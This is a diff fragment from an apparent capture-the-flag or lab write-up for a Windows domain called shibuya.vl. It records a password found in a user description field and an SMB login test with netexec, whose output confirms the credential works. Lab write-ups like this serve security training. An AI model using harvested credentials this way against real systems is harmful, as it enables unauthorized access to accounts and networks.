@@ -183,6 +183,12 @@ Found what looks like a password in the user description
 ```python
 svc_autojoin:K5&A6Dw9d8jrKWhV
 ```
-Ill 
+Ill test these creds
+
+```python
+xc smb AWSJPDC0522.shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV'  
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV
+```
 
 
